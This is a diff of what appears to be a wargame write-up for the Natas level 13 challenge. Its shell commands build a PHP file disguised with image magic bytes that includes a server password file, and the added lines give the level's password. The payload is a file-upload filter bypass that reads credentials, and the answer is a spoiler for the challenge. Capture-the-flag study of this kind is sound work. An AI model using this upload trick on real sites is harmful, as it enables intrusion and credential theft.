@@ -43,11 +43,6 @@ echo "\xff\xd8\xff\xe8 <? include '/etc/natas_webpass/natas14'; ?>" > exp.php
 echo "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A <? include '/etc/natas_webpass/natas14'; ?>" > exp.php
 ```
 
+Now upload your file, and get to the location and you will get the password for natas14.
 
-
-
-
-
-
-
-
+Here is the password for natas14 : Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
